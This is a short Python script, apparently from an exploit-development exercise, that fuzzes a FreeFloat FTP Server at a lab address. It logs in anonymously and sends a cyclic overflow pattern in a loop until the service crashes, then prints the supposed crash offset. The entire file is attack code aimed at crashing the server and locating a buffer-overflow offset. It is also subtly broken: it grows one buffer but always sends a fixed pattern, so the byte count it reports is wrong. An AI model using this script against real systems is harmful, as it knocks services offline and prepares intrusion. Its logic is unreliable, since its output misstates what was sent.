import socket
import time
import sys

buffer = 'A'*100
pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to Target FreeFloat FTP Server
        s.connect(('192.168.75.132', 21))
        s.recv(1024)
        s.send('USER anonymous\r\n')
        s.recv(1024)
        s.send('PASS anonymous\r\n')
        s.recv(1024)
        s.send(pattern + '\r\n')
        s.recv(1024)
        s.send('QUIT\r\n')
        s.close()
        print("[*] Buffer sent : " + str(len(buffer)))
        time.sleep(1)
        buffer = buffer + 'A'*100
    except:
        print("[*] Fuzzing crashed at byte : " + str(len(buffer)))
        sys.exit()